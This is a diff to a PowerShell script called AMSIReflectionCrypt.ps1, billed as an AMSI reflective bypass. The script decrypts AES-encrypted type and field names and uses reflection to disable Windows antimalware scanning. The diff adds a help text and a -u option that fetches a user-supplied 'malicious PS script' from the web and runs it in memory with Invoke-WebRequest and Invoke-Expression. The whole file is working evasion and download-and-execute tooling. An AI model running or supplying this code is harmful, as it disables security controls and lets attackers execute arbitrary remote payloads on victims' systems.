@@ -1,3 +1,31 @@
+
+param(
+    [switch]$ts,
+    [string]$u,
+	[switch]$h
+)
+
+$help = @("
+	A simple AMSI Reflective bypass
+ 
+	-ts  Invoke the TestScript.ps1 from GitHub.
+
+	-u   Full path to your web hosted malicious PS script (Default - TestScript.ps1 from GitHub).
+
+
+    Examples:
+   -----------
+	.\AMSIReflectionCrypt.ps1 -ts  [test only]
+	.\AMSIReflectionCrypt.ps1 -ts -u https://PATH/TO/script.ps1  [test and script]
+	
+	"
+)
+
+if ($h) {
+    Write-Host -Object $help
+    return
+}
+
 #Decrypt base64 string Encrypted with AES-128 (string, key, IV)
 function Decrypt-StringAES128 {
     param (
@@ -52,5 +80,14 @@ $decryptedString2 = Decrypt-StringAES128 -EncryptedText $encryptedString2 -Key $
 [Ref].Assembly.GetType('System.Management.Automation.'+$decryptedString1).GetField($decryptedString2,'NonPublic,Static').SetValue($repalcement1,$repalcement2)
 
 #Change this to execute desierd command freely (Only in memory execution in running PS proccess)
-$scriptContent = Invoke-WebRequest -Uri https://raw.githubusercontent.com/M0M3NTUM44/AMSIReflectionCrypt/main/TestScript.ps1 -UseBasicParsing
-Invoke-Expression -Command $scriptContent
+if (-not $u) {
+    $ts = $true
+}
+if ($ts) {
+    	$scriptContent = Invoke-WebRequest -Uri https://raw.githubusercontent.com/M0M3NTUM44/AMSIReflectionCrypt/main/TestScript.ps1 -UseBasicParsing
+		Invoke-Expression -Command $scriptContent
+}
+if ($u) {
+    	$scriptContent = Invoke-WebRequest -Uri $u -UseBasicParsing
+		Invoke-Expression -Command $scriptContent
+}
